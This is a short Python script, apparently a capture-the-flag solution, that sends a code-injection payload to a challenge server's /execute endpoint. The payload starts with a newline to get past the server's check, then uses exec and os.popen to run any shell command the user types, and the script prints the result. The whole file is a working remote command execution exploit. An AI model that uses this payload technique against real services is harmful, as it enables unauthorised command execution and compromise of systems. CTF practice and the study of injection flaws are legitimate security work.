import requests,json
cmd=input('Commmand: ')
PL=f"\nstr(exec(\"import os; result=os.popen(\'{cmd}\').read();\"))+result"
print(PL)
r=requests.post(
    "https://uoftctf-no-code.chals.io/execute",
    data={"code": PL}
)
data=json.loads(r.content.decode())
print(data['output'][4:])